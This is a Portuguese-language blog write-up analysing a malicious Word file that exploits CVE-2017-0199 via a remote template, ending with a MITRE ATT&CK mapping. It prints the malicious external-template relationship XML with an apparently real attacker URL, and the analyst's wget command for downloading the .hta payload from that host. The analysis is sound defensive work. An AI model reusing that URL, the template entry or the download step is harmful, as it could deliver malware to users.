<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="../../css/css-paper/paper.css">
    <link rel="shortcut icon" href="../../img/favicon.png" type="image/x-icon">
    <title>paper - Exploração CVE-2017-0199 em Documento Word
OpenXML</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/xt256.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/c.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/vbscript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/rust.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/yaml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/htmlbars.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/nginx.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/shell.min.js"></script>
    <script>
        hljs.highlightAll();
        //  hljs.configure({languages: []});
    </script>
</head>

<body>
    <div class="main_container">
        <header class="header_top">
            <div class="left-section">
                <a href="../../index.html" class="menu-link">[ 0xh0m3 ]</a>
                <a href="../../a/about.html" class="menu-link">[ 0xAb0ut-Us ]</a>
                <a href="../../c/contribute.html" class="menu-link">[ 0xContribut3 ]</a>
                <a href="../../w/worms.html" class="menu-link">[ 0xW0rms ]</a>
            </div>
            <div class="right-section">
                <span class="glitch-text">0xPwnbuff3r</span>
            </div>

        </header>

        <main class="content">
            <h1 class="pwntitle">Exploração CVE-2017-0199 em Documento
Word OpenXML</h1>
            <article class="article">
                <h2 id="introducao">Introducao</h2>
                <p>Este paper descreve a análise de um documento
                malicioso (<code>.doc</code>) identificado como
                explorando a vulnerabilidade
                <strong>CVE-2017-0199</strong>. A investigação envolveu
                inspeção de cabeçalhos de arquivo, análise de macros,
                extração do conteúdo do OpenXML e investigação de links
                externos que indicam carregamento remoto de
                payloads.</p>
                <hr />
                <h2 id="1-identificação-do-arquivo">1. Identificação do
                Arquivo</h2>
                <p>O primeiro passo foi determinar o tipo de
                arquivo:</p>
                <pre class="bash"><code>file massachusetts-wolfram-emma-august.doc</code></pre>
                <p>Resultado:</p>
                <pre><code>Microsoft Word 2007+</code></pre>
                <p>Em seguida, os primeiros bytes do arquivo foram
                examinados:</p>
                <pre class="bash"><code>xxd -l 32 massachusetts-wolfram-emma-august.doc</code></pre>
                <p>Saída:</p>
                <pre><code>504b 0304 ... PK........</code></pre>
                <ul>
                <li>Observação: o header <code>PK</code> indica que o
                arquivo é baseado em ZIP, ou seja, um
                <strong>OpenXML</strong> (<code>.docx</code>) mesmo com
                extensão <code>.doc</code>.</li>
                </ul>
                <hr />
                <h2 id="2-verificação-de-macros">2. Verificação de
                Macros</h2>
                <p>Utilizando <code>olevba</code> para inspecionar a
                presença de macros VBA ou XLM:</p>
                <pre class="bash"><code>olevba massachusetts-wolfram-emma-august.doc</code></pre>
                <p>Resultado:</p>
                <pre><code>No VBA or XLM macros found.
Type: OpenXML</code></pre>
                <ul>
                <li>Nenhuma macro foi detectada, o que reforça a
                necessidade de investigar <strong>outros vetores de
                exploração</strong>, como templates remotos
                (CVE-2017-0199).</li>
                </ul>
                <hr />
                <h2 id="3-extração-do-conteúdo-openxml">3. Extração do
                Conteúdo OpenXML</h2>
                <p>Como o arquivo é um ZIP, ele foi extraído para
                inspeção manual:</p>
                <pre class="bash"><code>unzip massachusetts-wolfram-emma-august.doc -d docx_extract</code></pre>
                <p>Arquivos extraídos incluem:</p>
                <ul>
                <li><code>word/document.xml</code> — conteúdo principal
                do documento.</li>
                <li><code>word/_rels/document.xml.rels</code> —
                referências a objetos e links externos.</li>
                <li><code>word/_rels/settings.xml.rels</code> —
                configurações do documento, incluindo <strong>templates
                externos</strong>.</li>
                <li><code>word/media/</code> — imagens
                incorporadas.</li>
                </ul>
                <hr />
                <h2 id="4-investigação-de-links-externos">4.
                Investigação de Links Externos</h2>
                <p>Foi realizada busca por URLs e referências a scripts
                remotos:</p>
                <pre class="bash"><code>grep -RiE &quot;http|\.hta&quot; docx_extract</code></pre>
                <p>Resultado crítico:</p>
                <pre class="xml"><code>&lt;Relationship Id=&quot;rId1&quot;
 Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot;
 Target=&quot;https://veryniceworkingwithbestfuturecareerofferingforgoodpeopleswhoiloversaround.doTX@go.silpo.ua/Fpp96T&quot;
 TargetMode=&quot;External&quot;/&gt;</code></pre>
                <ul>
                <li>Indicação de <strong>template remoto</strong>, vetor
                principal da exploração CVE-2017-0199.</li>
                <li>Ao abrir o documento, o Office tentaria carregar o
                template remoto, normalmente um <code>.hta</code> que
                baixaria o payload final.</li>
                </ul>
                <hr />
                <h2 id="5-tentativa-de-recuperar-payload">5. Tentativa
                de Recuperar Payload</h2>
                <p>Foi tentado o download do payload indicado pelo
                template remoto:</p>
                <pre class="bash"><code>wget --no-check-certificate -O payload.hta &quot;https://veryniceworkingwithbestfuturecareerofferingforgoodpeopleswhoiloversaround.doTX@go.silpo.ua/Fpp96T&quot;</code></pre>
                <p>Resultado:</p>
                <ul>
                <li>O servidor redirecionou para outro endereço
                (<code>HTTP 302</code>), mas o download falhou
                (<code>Connection refused</code>).</li>
                <li>Isso indica que os hosts do atacante provavelmente
                foram desativados ou removidos após a detecção.</li>
                </ul>
                <h2
                id="6-mitre-attck-mapping-para-o-documento-malicioso-cve-2017-0199">6.
                MITRE ATT&amp;CK Mapping para o documento malicioso
                CVE-2017-0199</h2>
                <p>Categoria ATT&amp;CK Tática Técnica Evidência na
                análise</p>
                <p>Initial Access <code>TA0001</code> – Initial Access
                <code>T1193</code> – Spearphishing Attachment O
                documento Word foi enviado como anexo malicioso, visando
                que a vítima abra e ative a exploração.</p>
                <p>Execution <code>TA0002</code> – Execution
                <code>T1204.002</code> – User Execution: Malicious File
                A exploração CVE-2017-0199 exige que o usuário abra o
                documento, que então baixa o template remoto (HTA).</p>
                <p>Execution <code>TA0002</code> – Execution
                <code>T1059.005</code> – Command and Scripting
                Interpreter: HTML/HTA O template remoto baixado
                normalmente é um .hta, que executa código malicioso em
                Windows Script Host.</p>
                <p>Persistence <code>TA0003</code> – Persistence
                <code>T1547.001</code> – Boot or Logon Autostart
                Execution: Registry Run Keys / Startup Folder
                (potencial) Muitos payloads entregues via HTA configuram
                persistência, embora neste caso o payload não tenha sido
                obtido.</p>
                <p>Defense Evasion <code>TA0005</code> – Defense Evasion
                <code>T1027</code> – Obfuscated Files or Information O
                malware disfarça o documento como .doc clássico, mas é
                um OpenXML (.docx).</p>
                <p>Command and Control <code>TA0011</code> – Command and
                Control <code>T1071.001</code> – Application Layer
                Protocol: Web Protocols O documento tenta baixar um
                payload remoto via HTTP/HTTPS.</p>
                <hr />
                <h2 id="7-conclusão">7. Conclusão</h2>
                <ul>
                <li><p>O documento analisado é um <strong>OpenXML (.docx
                disfarçado como .doc)</strong>.</p></li>
                <li><p>Não contém macros, mas explora <strong>template
                remoto</strong>, vetor associado ao
                <strong>CVE-2017-0199</strong>.</p></li>
                <li><p>Ferramentas utilizadas:</p>
                <ul>
                <li><code>file</code> e <code>xxd</code> — identificação
                de tipo de arquivo e inspeção de header.</li>
                <li><code>olevba</code> — detecção de macros.</li>
                <li><code>unzip</code> — extração do conteúdo
                OpenXML.</li>
                <li><code>grep</code> — pesquisa de URLs e objetos
                suspeitos.</li>
                <li><code>wget</code> — tentativa de recuperação do
                payload remoto.</li>
                </ul></li>
                </ul>
                <p>Apesar de não ter sido possível baixar o payload
                final, a análise confirma que o documento é malicioso.
                Fiquei muito triste por essa analise terminar assim, mas
                da próxima, eu pego eles xD! Virus Total: <a
                href="https://www.virustotal.com/gui/url/00a591730cf2b1df1f689c2867650f69b609e58ea7d2ec77d5240dbafc49835f">https://www.virustotal.com/gui/url/00a591730cf2b1df1f689c2867650f69b609e58ea7d2ec77d5240dbafc49835f</a></p>
                <p><img src="../../img/images/pa1va/image.png"
                alt="1" /></p>
                <p>thx for reading &lt;3</p>
                <ul>
                <li>@Pa1va</li>
                </ul>
            </article>

            <a href="../../index.html" class="back-link">← Voltar para a página principal</a>
        </main>

        <footer class="footer">
            <div class="footer-content">
                <span>&copy; 2025 - pwnbuffer.org </span>
                <span class="footer-separator">|</span>
                <a href="https://discord.gg/RZVv6baUc7" target="_blank" class="footer-link">[ Discord ]</a>
                <span class="footer-separator">|</span>
                <a href="https://x.com/pwnbff" target="_blank" class="footer-link">[ X ] </a>
                <span class="footer-separator">|</span>
                <a href="../../a/wallpapers.html" target="_blank" class="footer-link">[ Wallpapers ] </a>

        </footer>
    </div>

</body>
<script>
    document.addEventListener("DOMContentLoaded", () => {
        const els = document.querySelectorAll(".glitch-text, .pwntitle");
        const chars = "\u0025\u0023\u0024\u0040\u005E\u0026\u002A\u0021\u003F\u003C\u002D\u003E\u002B\u007C\u002A";

        els.forEach(el => {
            const originalText = el.textContent;

            function glitchEffect() {
                let iterations = 0;
                const interval = setInterval(() => {
                    el.textContent = originalText
                        .split("")
                        .map((letter, index) => {
                            if (index < iterations) {
                                return originalText[index];
                            }
                            return chars[Math.floor(Math.random() * chars.length)];
                        })
                        .join("");

                    iterations += 1 / 2;

                    if (iterations >= originalText.length) {
                        clearInterval(interval);
                        el.textContent = originalText;
                    }
                }, 50);
            }

            setInterval(glitchEffect, 12000);
        });
    });
</script>

</html>